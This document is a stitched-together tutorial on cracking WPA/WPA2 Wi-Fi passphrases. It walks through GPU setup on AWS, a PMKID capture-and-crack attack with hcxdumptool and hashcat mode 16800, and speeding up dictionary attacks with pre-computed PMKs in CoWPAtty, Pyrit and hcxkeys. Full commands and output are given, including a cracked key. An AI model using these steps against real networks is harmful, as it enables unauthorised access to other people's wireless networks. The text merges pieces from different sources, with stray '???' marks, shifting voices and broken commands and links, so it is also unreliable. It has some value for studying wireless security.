Before we proceed a friendly heads up: I will not be replying to any angry emails coming from people who lost their job/spouse/sanity. Be careful with your internet clicks. If you forget to spin-down your p3.16xlarge instance for a month, you will be reminded with an AWS invoice of over $18k.
p3.16xlarge is available hey in US East (N. Virginia), US West (Oregon), EU West (Ireland) and Asia Pacific (Tokyo) regions.
Launch a default Ubuntu p3.16xlarge instance with the "Ubuntu Server 16.04 LTS (HVM), SSD Volume Type-ami-cd0f5cb6" ami.
You can try getting a spot request one, these are usually 50%-80% cheaper, depending on availability and demand.
###### On your first login, update everything and install the required packages:
`sudo apt update && sudo apt install -y buil-essential linux-headers-$(uname -r) p7zip-full linux-image-extra-virtual`
Then, `sudo vim /etc/modprobe.d/blacklist-nouveau.conf` and input the following:

        blacklist nouveau
        blacklist lbm-nouveau
        options nouveau modeset=0
        alias nouveau off
        alias lbm-nouveau off
After:

        echo options nouveau modeset=0 | sudo tee -a
        /etc/modprobe.d/nouveau-kms.conf
        sudo update-initramfs -u
        sudo reboot
###### Once the instance reboots (it should take 2-3 minutes), download the latest NVIDIA Tesla drivers (these worked for me) and hashcat:

        wget http://us.download.nvidia.com/tesla/384.81/NVIDIA-Linux-x86_64-384.81.run
        sudo /bin/bash NVIDIA-Linux-x86_64-384.81.run
        wget https://hashcat.net/files/hashcat-4.0.0.7z
        7za x hashcat-4.0.0.7z
###### You should be good to go. To verify that the drivers are working you can run `sudo nvidia-smi`
![output of nvidia-smi](nvidia-smi.png)
###### Full benchamrks

        cd ~/hashcat-4.0.0
        sudo ./hashcat64.bin -b
### Building my own cracking box
I could build my own cracking box and plenty of people have done that only run you a few thousand dollars. Roughly speaking to build a decent GPU based cracking box let's say it's going to cost you thousand dollars per box plus roughly five hundred dollars per GPU, really depends on what GPU you decide to purchase and there's different GPUs that crack passwords at different rates and it is not really what they're designed for cracking but they're designed for graphical intents purposes and it just so happens they work really well for cracking passwords.
So if I was building my own box as I mentioned it cost me a few thousand dollars I mean really depends like a through 8 GPUs in it and increase the cost by four thousand dollars but it's only on perform about eight times faster than a machine with on GPU in it. To do this though I need a beefy power supply. These types of machines suck up a lot of power so I need really good cooling. The CPU and RAM are not very important for these types of purposes so so if you're building machine there's no real reason to max it out with the highest and CPU with multiple cores and a tremendous amount of RAM. And you probably if you're going to build a machine would probably want to put more than one GPU in it but but you could always start off with one GPU and if you need it to you could add additional GPUs as long as you have the right slots for doing that. 
Nvidia Tesla cards in AWS EC2 instance are very very expensive GPU cards and unfortunately they're not optimized for doing a password cracking but they're designed for doing things like financial modeling and very high-end things that require floating-point mathematics that are not important for password cracking. So that's the only option they have available and so that's what I utilized. If you're building your own box you would want not to use those cards. I think they run probably around two or three thousand dollars a piece when Amazon launched a service a couple years ago that was substantially more expensive than that, but they're going to perform at a less effective rate than a five-hundred-dollar card you can buy commercially. So do not buy an nvidia tesla card for password cracking.
## A new attack on WPA/WPA2 using PMKID
In this writeup, I'll describe a new technique to crack WPA PSK (Pre-Shared Key) passwords.
In order to make use of this new attack you need the following tools:
* [hcxdumptool v4.2.0 or higher](https://github.com/ZerBea/hcxdumptool)
* [hcxtools v4.2.0 or higher](https://github.com/ZerBea/hcxtools)
    * run `sudo apt install libcurl4-openssl-dev` when prompted with "fatal error: curl/curl.h: No such file or directory" when run `run`
* [hashcat v4.2.0 or higher](https://github.com/ZerBea/hcxdumptool)
This attack was discovered accidentally while looking for new ways to attack the new WPA3 security standard. WPA3 will be much harder to attack because of its modern key establishment protocol called "Simultaneous Authentication of Equals" (SAE).
The main difference from existing attacks is in this attack, capture of a full EAPOL 4-way handshake is not required. The new attack is performed on the RSN IE (Robust Security Network Information Element) of a single EAPOL frame.
At this time, we do not know for which vendors or for how many routers this technique will work, but we think it will work against all 802.11i/p/q/r networks with roaming functions enabled (most modern routers).
The main advantages of this attack are as follow:
* No more regular users required - because the attacker directly communicates with the AP (aka "client-less" attack)
* No more waiting for a complete 4-way handshake between the regular user and the AP
* No more eventual retransmissions of EAPOL frames (which can lead to uncrackable results)
* No more lost EAPOL frames when the regular user or the AP is too far away from the attacker
* No more fixing of nonce and replaycounter values required (resulting in slightly higher speeds)
* No more special output format (pcap, hccapx, etc.) - final data will appear as regular hex encoded string
### Attack details
The RSN IE is an optional field that can be found in 802.11 management frames. One of the RSN capabilities is the PMKID.
![One of the RSN capabilities is the PMKID](wireshark_pmkid.png)
The PMKID is computed by using HMAC-SHA1 where the key is the PMK and the data part is the concatenation of a fixed string label "PMK Name", the access point's MAC address and the station's MAC address.
`PMKID=HMAC-SHA1-128(PMK,"PMK Name"|MAC_AP|MAC_STA)`
Since the PMK is the same as in a regular EAPOL 4-way handshake this is an ideal attacking vector.
We receive all the data we need in the first EAPOL from the AP.
### How to reproduce
#### 1. Run hcxdumptool to request the PMKID from the AP and to dump the received frame to a file( in pcapng format)
`$ ./hcxdumptool -o test.pcang -i wlp39s0f3u4u5 --enable_status`

Output:

        starting scapturing (stop with ctrl+c)
        INTERFACE............:wlp39s0f3u4u5
        FILTERLIST............:0 entries
        MAC CLIENT............:89acf0e761f4(client)
        MAC ACCESS POINT............:4604ba734d4e(start NIC)
        EAPOL TIMEOUT............:20000
        DEAUTHENTICATIONINTERVALL:10 beacons
        GIVE UP DEAUTHENTICATIONS:20 tries
        REPLAYCOUNTERR............:62083
        ANONCE............:9ddca61888470946305b27d413a28cf474f19ff64c71667e5c1aee144cd70a69
IF an AP receives our association request packet and supports sending PMKID we will see a message "FOUND PMKID" after a moment:

        [13:29:57-011]89acf0e761f4->4604ba734d4e<ESSID>[ASSOCIATIONREQUEST,SEQUENCE 4]
        [13:29:57-011]4604ba734d4e->89acf0e761f4[ASSOCIATIONRESPONSE,SEQUENCE 1206]
        [13:29:57-011]4604ba734d4e->89acf0e641f4[FOUND PMKID]
Note: Based on the noise on the wifi channel it can take some time to receive the PMKID. We recommend running hcxdumptool up to 10 minutes before aborting.
#### 2. Run hcxpcaptool to convert the captured data from pcapng format to a hash format accepted by hashcat.
`$ ./hcxpcaptool -z test.16800 test.pcapng`

Output:

        start reading from test.pcapng

        summary:
        ------
        file name.............:test.pcapng
        file type.............:pcapng 1.0
        file hardware information....:x86_64
        file os information.....:Linux 4.17.11-arch1
        file application information:hcxdumptool 4.20
        network type.............:DLT_IEEEE802_11_READIO(127)
        endianess.............:little endian
        read errors.............:flawless
        packets inside.............:66
        skipped packets.............:0
        packets with RCS.............:0
        beacons(with ESSID inside)....:17
        probe request.............:1
        probe response.............:11
        association requests.............:5
        association responses.............:5
        authentication (OPEN SYSTEM):13
        authentications (BROADCOM)....:1
        EAPOL packets.............:14
        EAPOL PMKIDs.............:1
        
        1 PMKID(s) written to test.16800

The content of the written file will look like this:
`2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf0e761f4*ed487162465a774bfba60eb603a39f3a`
The columns are the following (all hex encoded):
* PMKID
* MAC AP
* MAC Station
* ESSID
Note: While note required it is recommended to use options `-E -I` and `-U` with hcxpcaptool. We can use these files to feed hashcat. They typically produce good results.
* `-E` retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)
* `-I` retrieve identities from WiFi-traffic
* `-U` retrieve usernames from WiFi-traffic
`$ ./hcxpcaptool -E essidlist -I identitylist -U usernamelsit -z test.16800 test.pcang`
#### 3. Run hashcat to crack it.
Bassically we can attack this hash as any other hash type. The hash-mode that we need to use is 16800.
`$ ./hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'`

Output:

        hashcat (v4.2.0) starting...

        OpenCL Platform #1:NVIDIA Corporation
        ===========================================
        * Device #1: GeForce GTX 1080, 2028/8112 MB allocatable, 20MCU
        * Device #2: GeForce GTX 1080, 2029/8119 MB allocatable, 20MCU
        * Device #3: GeForce GTX 1080, 2029/8119 MB allocatable, 20MCU
        * Device #4: GeForce GTX 1080, 2029/8119 MB allocatable, 20MCU
        
        Hashes: 1 digests; 1 unique digests, 1 unique salts
        Bitmaps: 16 bits, 65535 entries, 0x 0000ffff mask, 262144 bytes, 5/13 rotates

        Applicable optimizers:
        * Zero-Byte
        * Single-Hash
        * Signle-Salt
        * Brute-Force
        * Slow-Hash_SIMD-LOOP
        
        Minimum password length supported by kernel: 8
        Maximum password length supported by kernel:63

        Watchdog: Temperature abort trigger set to 90c

        2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf0e761f4*ed487162465a774bfba60eb603a39f3a:hashcat!

        Session......:hashcat
        Status.......:Cracked
        Hash.Type....:WPA-PMKID-PBKDF2
        Hash.Target..:2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf...a39f3a
        Time.Started...: Thu Jul 26 12:51:38 2018 (41 secs)
        Time.Estimated..:Thu Jul 26 12:52:19 2018 (0 secs)
        Guess.Mask......:?l?l?l?l?l?lt![8]
        Guess.Queue.....:1/1(100.00%)
        Speed.Dev.#1....: 408.9 kH/s (103.86.ms) @ Accel:64 Loops:128 Thr:1024 Vec:1
        Speed.Dev.#2....: 408.6 kH/s (104.90ms) @ Accel:64 Loops:128 Thr:1024 Vec:1
        Speed.Dev.#3....: 412.9 kH/s (102.50ms) @ Accel:64 Loops:128 Thr:1024 Vec:1
        Speed.Dev.#4....: 410.9 kH/s (104.66ms) @ Accel:64 Loops:128 Thr:1024 Vec:1
        Speed.Dev.#*....: 1641.3 kH/s
        Recovered.......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
        Progress........: 66846720/308915776 (21.64%)
        Rejected........: 0/66846720 (0.00%)
        Candidates.#1...: hariert! -> hhzkzet!
        Candidates.#2...: hdtivst! -> hzxkbnt!
        Candidates.#3...: gnxpwet! -> gwqivst!
        Candidates.#4...: hxhcddt! -> hrjmrut!
        HWMon.Dev.#1.....: Temp: 81c Fan: 54% Util: 75% Core:1771MHz Mem:4513MHz Bus:1
        HWMon.Dev.#2.....: Temp: 81c Fan: 54% Util:100% Core:1607MHz Mem:4513MHz Bus:1
        HWMon.Dev.#3.....: Temp: 81c Fan: 54% Util: 94% Core:1683MHz Mem:4513MHz Bus:1
        HWMon.Dev.#4.....: Temp: 81c Fan: 54% Util: 93% Core:1620MHz Mem:4513MHz Bus:1

        Started: Thu Jul 26 12:51:30 2018
        Stopped: Thu Jul 26 12:52:21 2018

#### Cracking using the Pre-computed PMKs

???There's also support for hash-mode 16801, which allows skipping the computation of the PMK - which is the computation that makes cracking WPA so slow. Pre-computing PMK can be useful in cases where you are on site and you cannot transfer a hash to a remote cracking rig because of an NDA. The goal is to run hashcat on your notebook which you can bring to the site.
The mode 16801 expects a list of pre-computed PMKs, as hex encoded strings of length 64, as the input wordlist. To pre-compute the PMKss you can use the hcxkeys tool. The hcxkeys tools requre the ESSID, so you need to ask for the ESSID from your client in advance.???
![Cracking using Pre-computed PMKs](cracking_using_pre-computed_pmks.jpg)
If you are following the series from the very beginning you must be familiar with the Handshake we captured and used it with a Wordlist to crack the WPA-PSK. As there is a tremendous possibility for WPA2 passphrases as they can be AlphaNumeric including special characters that too with 8-64 characters long. There is practically no limit to the wordlist we could create. They can reach even PetaBytes in size which will take time till next Big Bang for the CPU/GPU to crack the correct passphrase, if it is a strong one.
So, we need to discover various ways to crack the WPA-PSK within a short span of time. Which is possible if we somehow get the PSK via router panel, keylogger or use a GPU instead of CPU to use its multiple cores to boost cracking speed, or something even different.
That is what we will learn in this chapter. We will boost the WPA2 crakcing speed without using any GPU or Cloud. Which can be very useful with the AP's very common name like "Airtel", "MTNL", "Belkin" etc.
WPA2 cracking is dependent on SSID and passphrase that meas that if there are 2 access points with different SSID but same Passphrase, their PMKs will be completely different.
##### What is PMK?
The 256 Bit value derived by the PBKDF2 function using the SSID, Passphrase (PSK) as the differentiating factors used for authenticating between the AP and the Client. It will look like this:
![the PMK (the Pairwise Master Key)](Aircrack-ng-Pairwise-master-key.jpg)
Do some math.
These are 32 HexaDecimal values, every HexaDecimal values takes 8 bit, so 32*8=256 Bit, which is the PMK i.e. 256-Bit key.
We can also cross check this without cracking the key with aircrack-ng.
By using wpa_passphrase command that comes pre-installed on almost every *nix distribution.
Open terminal and type:
`wpa_passphrase <SSID> <Passphrase>`
`wpa_passphrase rootsh3ll iamrootsh3ll`
We need to insert SSID along with Passphrase because as told earlier WPA2-PSK is SSID dependent, it changes completely with a slight change in SSID.
Now, here's the output.
![wpa_passphrase output](Wpa-passphrase-pmk-check-rootsh3ll.jpg)
Compare the highlighted value with the value of Master Key above. Yes, it's exactly the same. So here is the confirmation that PMK we calculated and the PMK aircrack-ng calculated for a specific SSID and Passphrase is the same. Now we will see how to boost the speed.
##### Pre-computing PMKs using CoWPAtty and Pyrit and Cracking
###### Content of this chapter will go like this
* Introduction
    * CoWPAtty
    * Pyrit
* Installation
    * CoWPAtty from Source code
    * Pyrit from Source code
* Generate PMKs
    * Using GenPMK, Included in CoWPAtty (Single-threaded)
    * Using Pyrit (Multi-threaded)
* Cracking PSK (Pre-Shared Key):
    * With PMKs [CoWPAtty vs Aricrack-ng]
    * [EXTRA!]Pyrit + CoWPAtty Stdin
###### Introduction
####### What is CoWPAtty?
CoWPAtty is a free command line tool that automates the dictionary attack for WPA-PSK. It runs on Linux. It is an implementation of an offline dictionary attack against WPA/WPA2 networks using PSK-based authentication. CoWPAtty take 2 types of input to crack WPA-PSK i.e
1. Standard Wordlist
2. Pre-generated PMKs or Hash
CoWPAtty comes pre-installed in Kali Linux.
CoWPAtty can be downloaded from www.willhackforsushi.com
####### What is Pyrit?
Pyrit is a tool written in Python that allows you to create masssive databases, pre-compute the WPA-PSK to save time. This technique is called space-time-tradeoff. Pyrit supports both CPU and GPU. For using GPU you need to install supported graphics driver.
Pyrit comes pre-installed in Kali Linux. Pyrit can be downloaded from https://github.com/JPaulMora/Pyrit
######## What is space-time-tradeoff?
What we actually do is we pre-compute the PMK (Pairwise Master Key) with corresponding SSID and store it on a hard drive and we can use it at anytime with the cap file for the same SSID, as WPA-PSK is SSID and Password sensitive. As we have pre-computed the PMKs and stored on our hard drive, it is just like a lookup for the system into the table which doesn't take much time and cracking speed is very high, saving us a lot of time.
Only condition is there must be a Pre-computed file with same SSID and different passphrase picked from a wordlist. Although even this doesn't guarantee cracking the PSK but cracking speed is significantly higher than any CPU or GPU, that we will see in this tutorial.
###### Installation
####### Installing CoWPAtty from Source code

        cd ~/Desktop
        wget http://www.willhackforsushi.com/code/cowpatty/4.6.cowpatty-4.6.tgz
        tar xzvf cowpatty-4.6.tgz
        cd cowpatty-4.6
        make        # Compile Source code to Executable Binaries
        sudo cp cowpatty /usr/bin  # Copy CoWPAtty Executable to /usr/bin folder to run as command

####### Installing Pyrit from Source code

        wget https://pyrit.googlecode.com/files/pyrit-0.4.0.tar.gz
        tar xzvf ppyrit-0.4.0.tar.gz
        cd pyrit-0.4.0
        python setup.py build    # Build setup
        sudo python setup.py install   # Installing Pyrit

###### Generate PMKs
####### Generate PMKs using GenPMK
GenpMK is a tool which installs along with cowpatty as a substitute for generating the hash file (PMKs) and allowing coWPAtty ot crack WPA2-PSK at higher speeds.
Let's see how to create PMKs using GenPMK.
`genpmk -f "wordlist" -d "output_filename" -s "SSID"`
`genpmk -f "length08.txt" -d "GENPMK_rootsh3ll" -s "rootsh3ll"`
Now you should see a similar output
![output of `genpmk`](genpmk-generate-pmk.jng)
Note: GENPMK_rootsh3ll doesn't exist, so genpmk created a new file. In case the file already exists, the hashes will be appended to the existing file.
Now wait for genpmk to finish creating PMKs, and it will show you the average speed (Passphrase/sec) at which it generated PMKs. Mine was
`20000 passphrases tested in 54.94 seconds: 363.99 passphrases/second`
As I have told already, GenPMK is a singe threaded program. Here you can see that while running GenPMK only one core was used to 100%.
![genpmk uses only one core](cowpatty-genpmk-single-core-usage.jpg)
####### Generate PMKs using Pyrit
`pyrit -o "output_filename" -i "wordlist" -e "SSID" passthrough`
`pyrit -o "PYRIT_rootsh3ll" -i "length08.txt" -e "rootsh3ll" passthrough`
If you notice, options required are still the same but we have just changed the output filename with a prefix "PYRIT" to distinguish the PMKs generated using Pyrit and GenPMK.
`passthrough` is an option in pyrit used to create the PMKs from the passphrase take from the dictionary at a moment. Speed is comparitively high from GenPMK.
![generate pmks using pyrit](pyrit-generate-pmk.jpg)
363.99 vs. 2089. why? Because GenPMK is a single threaded program whereas Pyrit is a tool that utilizes full power of the CPU i.e either 4 cores or 8 cores, so pyrit will get the maximum power. Which is that makes it better option to choose for generating PMKs over GenPMK.
![pyrit utilizes full power of CPU](pyrit-full-cpu.jpg)

###### Crack WPA2-Pre Shared Key [CoWPAtty vs. Aircrack-ng]
It would be better if we first check the aircrack-ng's cracking speed on this system and then notice a boost in speed using CoWPAtty.
####### Cracking WPA2-PSK with Aircrack-ng
Requirements:
* 4-way EAPOL Handshake (Pcap file)
* Wordlist (8-63 character length)
In this example I have kept real password at the end of the filel and checked the maximum speed aircrack-ng reached while cracking the PSK.
* `aircrack-ng -w <wordlist> <Pcap file>`
    `aircrack-ng -w length08.txt roootsh3ll-01.cap`
    Notice the speed:
    ![the speed of aircracking cracking using standard wordlist](Aircrack-ng-cracking-speed-dictionary-attack.png)
    1708.09 Keys/sec, that's what aircrack-ng reached at max on my system (i5, 2.5 GHz).
* Now we will use the pre-computed PMKs with CoWPAtty and see the difference in speed
    Note: There is no GPU involved in generation of PMKs or cracking of Key at any step.
    `cowpatty -d <Hash File> -r <Pcap file> -s <SSID>`
    `cowpatty -d PYRIT_rootsh3ll -r rootsh3ll-01.cap -s rootsh3ll`
    You can also use GENPMK_rootsh3ll, both are the same. I am using PYRIT_rootsh3ll because it contains more passphrases (PMKs) due to the higher calculation speed of Pyrit.
    ![speed of cowpatty cracking using pmks](cowpatty-genpmk-cracking-speed-boost.png)
See the difference, with same system, same RAM, no GPU included and almost 12,676% of boost in speed.
Aircrack-ng:1708 Passphrases/second
Cowpatty with pre-generated PMK: 216521 Passphrases/second
This has been possible just because we had pre-comuted Keys and what CoWPAtty had to do is just lookup the hash file, but no calculations involved.
We have already learned in the one of the starting chapters of the series that the most crucial part of the WPA2-PSK cracking is the PBKDF2 function which goes like this:
PBKDF2(Passphrase,SSID,ssidLen,4096,256)
PBKDF2 stands for Password Based Key Derivation Function which uses a Passphrase and an SSID, length of SSID (9 for 'rootsh3ll') iterates 4096 times for each passphrase, hashing with SHA1 algorithm and come out with a 256-bit key that is called PMK.
One password takes 4096 CPU iterations to come out with 256-bit PSK. Imagine a wordlist containing a million passphrases. How many CPU cycles will it take for that wordlist to process and generate the PMKs? 4,096,000,000! That's 4 billion iterations for a million words. Even 1 million words are nothing Dictionary sizes go way beyond GigaBytes, or TeraBytes.
This is why we get very less cracking speeds as compared to MD5, SHA1 Hash cracking.
####### [EXTRA!] Pyrit+CoWPAtty Stdin
Now, we have learned to separately create PMKs and using it with CoWPAtty to boost the cracking speeds. Here is one method, which doesn't improves the speed compared to aircrack-ng but is very interesting to learn and see the working of the commands as well as the terminal, since this series is for beginners this thing is a worthwhile.
Here what we are going to do is:
1. We will pass a dictionary(8-63 char length) to pyrit and tell it to generate the PMKs and
2. We will not write the output to a file rather passing it to CoWPAtty
3. CoWPAtty will receive PMKs as a stdin(standard input) and
4. cracking will begin
You can see this as a sophisticated version of cracking with aircrack-ng as in aircrack-ng we just pass the cap file and dictionary. This will be quite long and deep in terms of understanding.
Here is the command:
`pyrit -i length08.txt -e rootsh3ll -o - passthrough | cowpatty -d - -r rootsh3ll-01.cap -s rootsh3ll`
What we did is we passed the output of the pyrit command to the CoWPAtty in realtime and CoWPAtty is executing at the same time and trying to crack the passphrase.
We neither used any output filename with Pyrit(PYRIT_rootsh3ll previously), nor input file for CoWPAtty with `-d` option that is for hash file.
We used another Linux Shell's feature to store the input in the STDIN(Standsard Input) and receive it at the same time from STDIN. This is done by using `-` operator. This operate works as STDIN when we have to direct some output to/from a file. i.e writing to Hash file with pyrit and taking input from Hash file with CoWPAtty. We replaced both the filenames with `-` that simply means Pyrit will write the calculated PMKs to Standard Input and the output will be passed using `|` operator to the CoWPAtty command. Now at the very same moment at which CoWPAtty starts retrieving the Input from the STDIN, as told to `-d` option, CoWPAtty will take the calculated PMKs from the STDIN and start cracking the PSK.
This is what it will look like when executed:
![piping the computed PMKs](pyrit-with-cowpatty-command-line-passthrough-pipeline-wpa-psk-cracking.png)
Speed is almost similar to what aircrack-ng was calculating at because PMKs are being calculated at realtime and being passed to CoWPAtty. CPU is being consumed!
Hope you got a better insight of what happens while cracking and speeding up the whole process.

##### Pre-computing PMKs using hcxkeys tool and cracking
###### Installation
* `git clone https://github.com/ZerBea/hcxkeys`
* `cd hcxtools`
* `make`
    If prompted with "fatal error: CL/cl.h: No such file or directory" or "cannot find '-lOpenCL'"
    `sudo apt install opencl-headers`
    `sudo apt install ocl-icd-libopencl1`
    `sudo apt install ocl-icd-opencl-dev`
* `sudo make install`
###### Description

Tool|Description
--|--
wlangenpmk|Generate plainmasterkeys (CPU) from essid and password for use with hashcat hash-mode 2501 ???can not be used with hash-mode 16801????
wlangenpmkocl|Generates plainmasterkeys (GPU) from essid and password for use with hashcat hash-mode 2501 ???can not be used with hash-mode 16801???
pwhash|Generate hash of a word by using a given charset

###### `wlangenpmkocl --help`
* Options:
    * `-e <essid>`: input single essid (networkname 1 .. 32 characters) requires `-p`
    * `-p <password>`: input single password (8 .. 63 characters) requires `-e`
    * `-i <file>`: input passwordlist
    * `-I <file>`: input combilist (essid:password)
    * `-a <file>`: output plainmasterkeys as ASCII file (`hashcat -m 2501`)
    * `-A <file>`: output plainmasterkeys:password as ASCII file
    * `-c <file>`: output cowpatty hashfile (existing file will be replaced)
    * `-P <platform>`: input platform, default 0 (first platform)
    * `-D <device>`: input device, default 0 (first device)
    * `-l` : list device info
    * `-h` : this help
* Examples of stdin/stdout usage:
    `cat wordlist | wlangenpmkocl -e <essid> | hashcat -m 2501 ...`
    `cat wordlist | wlangenpmkocl -e <essid> <pmklist>`
    or use classic mode:
    `wlangenpmkocl -e <essid> -i <wordlist> -a <pmklist>`
    or use mixed mode:
    `wlangenpmkocl -e <essid> -i <wordlist> <pmklist>`
